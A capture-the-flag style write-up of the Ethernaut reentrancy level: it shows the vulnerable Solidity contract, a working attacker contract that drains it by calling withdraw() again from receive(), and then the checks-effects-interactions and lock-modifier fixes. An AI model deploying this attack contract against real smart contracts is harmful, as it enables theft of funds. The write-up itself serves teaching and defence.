# Ethernaut Challenge #10: Reentrancy

**Objective:** Steal all funds from the contract.

**Contract Analysis:**
```solidity
contract Reentrance {
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

**The Vulnerability:**

Line 16-17: External call BEFORE state update
```solidity
(bool result,) = msg.sender.call{value:_amount}("");  // Send ETH
// ...
balances[msg.sender] -= _amount;  // Update balance AFTER
```

**The Attack — Reentrancy:**

1. Donate 1 ETH to yourself
2. Call `withdraw(1 ETH)`
3. Contract sends you 1 ETH
4. Your contract's `receive()` is called
5. **Your receive() calls withdraw() AGAIN!**
6. Contract checks: `balances[you] >= 1 ETH` → TRUE (not updated yet!)
7. Sends you another 1 ETH
8. Repeats until contract is empty

**Malicious Contract:**
```solidity
contract Attack {
  Reentrance public target;
  
  constructor(address _target) {
    target = Reentrance(_target);
  }
  
  function attack() public payable {
    // 1. Donate to ourselves
    target.donate{value: 1 ether}(address(this));
    
    // 2. Withdraw (triggers reentrancy)
    target.withdraw(1 ether);
  }
  
  receive() external payable {
    // Keep withdrawing while target has balance
    if (address(target).balance > 0) {
      target.withdraw(1 ether);
    }
  }
}
```

**The Fix — Checks-Effects-Interactions:**
```solidity
function withdraw(uint _amount) public {
  require(balances[msg.sender] >= _amount);  // CHECK
  balances[msg.sender] -= _amount;            // EFFECT (first!)
  (bool result,) = msg.sender.call{value:_amount}("");  // INTERACTION (last)
  require(result);
}
```

**Or use ReentrancyGuard:**
```solidity
modifier nonReentrant() {
  require(!locked, "Reentrant call");
  locked = true;
  _;
  locked = false;
}
```

**Real-World Impact:**
- TheDAO hack: $60M stolen
- Multiple DeFi exploits
- The most famous vulnerability in smart contract history

**Status:** THE CLASSIC. Master this, master security.
